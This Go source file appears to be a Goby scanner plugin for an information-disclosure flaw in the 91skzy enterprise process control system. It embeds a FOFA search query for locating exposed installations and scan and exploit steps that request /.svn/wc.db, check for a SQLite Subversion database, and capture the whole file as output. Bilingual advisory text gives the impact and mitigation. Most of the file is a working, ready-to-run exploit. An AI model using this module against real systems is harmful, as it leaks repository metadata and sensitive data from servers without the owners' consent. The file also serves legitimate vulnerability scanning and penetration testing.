package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "91skzy Enterprise process control system wc.db Information Disclosure vulnerability",
    "Description": "<p>Spatiotemporal Intelligent Friend enterprise process management and control system is a system that uses JAVA development to provide process management and control for enterprises.</p><p>Spatiotemporal Wisdom enterprise process control system wc.db information leakage vulnerability, attackers can use the vulnerability to obtain sensitive information of the system.</p>",
    "Product": "时空智友企业流程化管控系统",
    "Homepage": "http://www.91skzy.net",
    "DisclosureDate": "2022-07-23",
    "Author": "橘先生",
    "FofaQuery": "body=\"企业流程化管控系统\" && body=\"密码(Password):\"",
    "GobyQuery": "body=\"企业流程化管控系统\" && body=\"密码(Password):\"",
    "Level": "2",
    "Impact": "<p>Spatiotemporal Wisdom enterprise process control system wc.db information leakage vulnerability, attackers can use the vulnerability to obtain sensitive information of the system.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.91skzy.net\">http://www.91skzy.net</a></p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://fofa.info/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/.svn/wc.db",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "M",
                    "Content-Length": "102",
                    "Connection": "close",
                    "Upgrade-Insecure-Requests": "1"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "SQLite format",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "dexsqlite_autoindex_ACTUAL_NODE_1ACTUAL_NOD",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/.svn/wc.db",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "M",
                    "Content-Length": "113",
                    "Connection": "close",
                    "Upgrade-Insecure-Requests": "1"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "SQLite format",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "dexsqlite_autoindex_ACTUAL_NODE_1ACTUAL_NOD",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]+)"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9",
    "Translation": {
        "CN": {
            "Name": "时空智友企业流程化管控系统 wc.db 文件信息泄露漏洞",
            "Product": "时空智友企业流程化管控系统",
            "Description": "<p>时空智友企业流程化管控系统是使用JAVA开发为企业提供流程化管控的一款系统。</p><p>时空智友企业流程化管控系统 wc.db 信息泄露漏洞，攻击者可利用该漏洞获取系统的敏感信息等。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.91skzy.net\">http://www.91skzy.net</a></p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>时空智友企业流程化管控系统 wc.db 信息泄露漏洞，攻击者可利用该漏洞获取系统的敏感信息等。</p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "91skzy Enterprise process control system wc.db Information Disclosure vulnerability",
            "Product": "时空智友企业流程化管控系统",
            "Description": "<p>Spatiotemporal Intelligent Friend enterprise process management and control system is a system that uses JAVA development to provide process management and control for enterprises.</p><p>Spatiotemporal Wisdom enterprise process control system wc.db information leakage vulnerability, attackers can use the vulnerability to obtain sensitive information of the system.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.91skzy.net\">http://www.91skzy.net</a></p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Spatiotemporal Wisdom enterprise process control system wc.db information leakage vulnerability, attackers can use the vulnerability to obtain sensitive information of the system.</p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10803"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
